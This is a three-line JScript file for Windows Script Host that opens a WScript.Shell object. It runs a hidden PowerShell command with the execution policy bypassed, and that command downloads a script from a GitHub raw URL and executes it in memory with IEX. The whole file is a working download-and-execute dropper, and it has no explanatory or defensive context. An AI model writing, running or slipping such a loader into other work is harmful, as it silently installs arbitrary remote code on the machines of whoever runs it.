var shell = new ActiveXObject("WScript.Shell");
var command = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/exec.ps1')\"";
shell.Run(command, 0, true);

